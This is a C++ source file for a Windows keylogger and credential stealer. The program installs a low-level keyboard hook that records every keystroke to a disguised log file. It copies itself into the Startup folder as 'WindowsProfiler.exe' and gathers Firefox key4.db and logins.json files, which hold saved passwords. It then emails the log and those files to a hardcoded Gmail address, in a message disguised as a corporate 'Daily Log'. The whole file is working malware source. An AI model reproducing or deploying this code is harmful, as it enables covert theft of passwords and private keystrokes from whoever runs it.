#include <windows.h>

#include <CkEmail.h>
#include <CkMailMan.h>
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <stdio.h>
#include <tchar.h>
#include <vector>

// #define DEBUG
#define firefox
// #define chrome
#define INFO_BUFFER_SIZE 32767

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void log(char *str);
char *translate(int vk, int up);
void netCatGo();
void sendEmail(CkMailMan &mailman, std::vector<std::string> fileList);

int shift = 0, caps = 0;
FILE *fd;

#ifdef DEBUG
int main(int argc, char *argv[])
#else
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
#endif
{
    std::string date = "\n\n\n-------------------------";

    auto t = std::time(nullptr);
    auto tm = *std::localtime(&t);
    std::stringstream ss;
    ss << std::put_time(&tm, "%d.%m.%Yr. %H:%M:%S");
    date += ss.str();

    date += "-------------------------\n\n\n";
    std::cout << date << std::endl;
    TCHAR filePath[INFO_BUFFER_SIZE] = {0};
    GetModuleFileName(NULL, filePath, INFO_BUFFER_SIZE);
    std::wcout << filePath << std::endl;

    DWORD len = INFO_BUFFER_SIZE;
    TCHAR username[INFO_BUFFER_SIZE] = {0};
    if (!GetUserName(username, &len))
        std::wcout << "Error with getting user name";
    std::wcout << username << std::endl;

    TCHAR secondPart[INFO_BUFFER_SIZE] = TEXT("/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/WindowsProfiler.exe");
    TCHAR destination[INFO_BUFFER_SIZE] = TEXT("C:/Users/");

    wcscat(destination, username);
    wcscat(destination, secondPart);

    std::wcout << destination << std::endl;

    if (CopyFile(filePath, destination, TRUE))
    {
        printf("Copied file\n");
    }
    else
    {
        printf("Could not copy file!\n");
    }

    HINSTANCE app = GetModuleHandle(NULL);
    SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, app, 0);
    MSG msg;
    const char *fname = "C:/ProgramData/windowsprofiler.txt";
    fd = fopen(fname, "a");
    fwrite(date.c_str(), 1, strlen(date.c_str()), fd);
    fflush(fd);

    std::vector<std::string> filesToSend = {fname};
    WIN32_FIND_DATA findData;
    HANDLE hFind = INVALID_HANDLE_VALUE;

#ifdef firefox

    LPWSTR profiles = _wgetenv(L"APPDATA");
    char cProfiles[INFO_BUFFER_SIZE] = {0};
    wcstombs(cProfiles, profiles, INFO_BUFFER_SIZE);
    strcat(cProfiles, "/Mozilla/Firefox/Profiles/");

    wcscat(profiles, L"/Mozilla/Firefox/Profiles/*");
    std::wcout << profiles << std::endl;

    hFind = FindFirstFile(profiles, &findData);

    if (hFind == INVALID_HANDLE_VALUE)
    {
        std::cout << "Error!" << std::endl;
    }

    do
    {
        if (wcscmp(findData.cFileName, L".") && wcscmp(findData.cFileName, L".."))
        {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                std::wcout << "Found profile: " << findData.cFileName << std::endl;
                char profileName[INFO_BUFFER_SIZE] = {0};
                wcstombs(profileName, findData.cFileName, INFO_BUFFER_SIZE);

                std::string path = cProfiles;
                path += profileName;

                std::string key4 = path + "/key4.db";

                filesToSend.push_back(key4);

                std::string logins = path + "/logins.json";

                filesToSend.push_back(logins);
            }
        }

    } while (FindNextFile(hFind, &findData) != 0);

    FindClose(hFind);

#endif

    for (std::string f : filesToSend)
    {
        std::cout << "Attachment " << f << std::endl;
    }

    CkMailMan mailman;
    mailman.put_SmtpHost("smtp.gmail.com");
    mailman.put_SmtpUsername("youremail@gmail.com");
    mailman.put_SmtpPassword("yourpassword");
    mailman.put_SmtpSsl(true);
    mailman.put_SmtpPort(587);

    sendEmail(mailman, filesToSend);

    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    fflush(fd);
    fclose(fd);
    return 0;
}

void sendEmail(CkMailMan &mailman, std::vector<std::string> fileList)
{
    CkEmail email;
    email.put_Subject("Daily Log");
    email.put_Body("Hello!\nWe are sending you your daily log of Windows Profiler ;)\nLook up attachments.\nCheers,\nJD - Bajo Jajo Corporation");
    email.put_From("Bajo Jajo Corporation");
    bool success = email.AddTo("Adam Podkowinski", "adampodkdev@gmail.com");

    for (std::string f : fileList)
    {
        const char *contentType = email.addFileAttachment(f.c_str());
        if (email.get_LastMethodSuccess() != true)
        {
            std::cout << email.lastErrorText() << "\r\n";
        }
    }

    success = mailman.SendEmail(email);
    if (success != true)
    {
        std::cout << mailman.lastErrorText() << "\r\n";
        return;
    }

    success = mailman.CloseSmtpConnection();
    if (success != true)
    {
        std::cout << "Connection to SMTP server not closed cleanly."
                  << "\r\n";
    }

    std::cout << "Mail with attachments sent!"
              << "\r\n";
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
    char *str = NULL;
    if (kb->vkCode == 0xA2 || kb->vkCode == 0xA5 || kb->vkCode == 0xA4)
    {
        return 0;
    }

    // printf("%X, ", kb->vkCode);
    // printf("%i\n", wParam);

    if (wParam == WM_KEYUP || wParam == 261)
    {
        str = translate(kb->vkCode, 1);
    }
    else if (wParam == WM_KEYDOWN || wParam == 260)
    {
        str = translate(kb->vkCode, 0);
    }
    if (str)
        log(str);
    return 0;
}

void log(char *str)
{
    // printf(str);
    fwrite(str, 1, strlen(str), fd);
    if (strstr(str, " ") || strstr(str, "\n"))
        fflush(fd);
}

char *translate(int vk, int up)
{
    if (up)
    {
        if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1))
            shift = 0;
        return 0;
    }
    else if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1))
    {
        shift = 1;
        return 0;
    }
    char *buf = (char *)malloc(16);
    memset(buf, 0, 16);
    if (vk < 0x29)
    {
        switch (vk)
        {
        case 0x08:
            strcpy(buf, "[BS]");
            break;
        case 0x09:
            strcpy(buf, "[TAB]");
            break;
        case 0x0d:
            strcpy(buf, "\n");
            break;
        case 0x14:
            caps ^= 1;
            break;
        case 0x20:
            buf[0] = ' ';
            break;
        case 0x25:
            strcpy(buf, "[LT]");
            break;
        case 0x26:
            strcpy(buf, "[UP]");
            break;
        case 0x27:
            strcpy(buf, "[RT]");
            break;
        case 0x28:
            strcpy(buf, "[DN]");
            break;
        }
        return buf;
    }
    if (vk > 0x69 && vk < 0x70)
    {
        buf[0] = (char)(vk - 0x40);
    }
    else if (vk > 0x6f && vk < 0x88)
    {
        sprintf(buf, "[F%d]", vk - 0x6f);
    }
    else if (isalpha(vk))
    {
        if (!caps)
            if (shift)
            {
                buf[0] = (char)(toupper(vk));
            }
            else
            {
                buf[0] = (char)(tolower(vk));
            }
        else if (!shift)
        {
            buf[0] = (char)(toupper(vk));
        }
        else
        {
            buf[0] = (char)(tolower(vk));
        }
    }
    else
    {
        switch (vk)
        {
        case '1':
            if (!shift)
            {
                buf[0] = (char)vk;
            }
            else
            {
                buf[0] = '!';
            }
            break;
        case '2':
            if (!shift)
            {
                buf[0] = (char)vk;
            }
            else
            {
                buf[0] = '@';
            }
            break;
        case '3':
            if (!shift)
            {
                buf[0] = (char)vk;
            }
            else
            {
                buf[0] = '#';
            }
            break;
        case '4':
            if (!shift)
            {
                buf[0] = (char)vk;
            }
            else
            {
                buf[0] = '$';
            }
            break;
        case '5':
            if (!shift)
            {
                buf[0] = (char)vk;
            }
            else
            {
                buf[0] = '%';
            }
            break;
        case '6':
            if (!shift)
            {
                buf[0] = (char)vk;
            }
            else
            {
                buf[0] = '^';
            }
            break;
        case '7':
            if (!shift)
            {
                buf[0] = (char)vk;
            }
            else
            {
                buf[0] = '&';
            }
            break;
        case '8':
            if (!shift)
            {
                buf[0] = (char)vk;
            }
            else
            {
                buf[0] = '*';
            }
            break;
        case '9':
            if (!shift)
            {
                buf[0] = (char)vk;
            }
            else
            {
                buf[0] = '(';
            }
            break;
        case '0':
            if (!shift)
            {
                buf[0] = (char)vk;
            }
            else
            {
                buf[0] = ')';
            }
            break;
        case 0xba:
            if (!shift)
            {
                buf[0] = ';';
            }
            else
            {
                buf[0] = ':';
            }
            break;
        case 0xbb:
            if (!shift)
            {
                buf[0] = '=';
            }
            else
            {
                buf[0] = '+';
            }
            break;
        case 0xbc:
            if (!shift)
            {
                buf[0] = ',';
            }
            else
            {
                buf[0] = '<';
            }
            break;
        case 0xbd:
            if (!shift)
            {
                buf[0] = '-';
            }
            else
            {
                buf[0] = '_';
            }
            break;
        case 0xbe:
            if (!shift)
            {
                buf[0] = '.';
            }
            else
            {
                buf[0] = '>';
            }
            break;
        case 0xbf:
            if (!shift)
            {
                buf[0] = '/';
            }
            else
            {
                buf[0] = '?';
            }
            break;
        case 0xc0:
            if (!shift)
            {
                buf[0] = '`';
            }
            else
            {
                buf[0] = '~';
            }
            break;
        case 0xdb:
            if (!shift)
            {
                buf[0] = '[';
            }
            else
            {
                buf[0] = '{';
            }
            break;
        case 0xdc:
            if (!shift)
            {
                buf[0] = '\\';
            }
            else
            {
                buf[0] = '|';
            }
            break;
        case 0xdd:
            if (!shift)
            {
                buf[0] = ']';
            }
            else
            {
                buf[0] = '}';
            }
            break;
        case 0xde:
            if (!shift)
            {
                buf[0] = '\'';
            }
            else
            {
                buf[0] = '\"';
            }
            break;
        }
    }
    return buf;
}
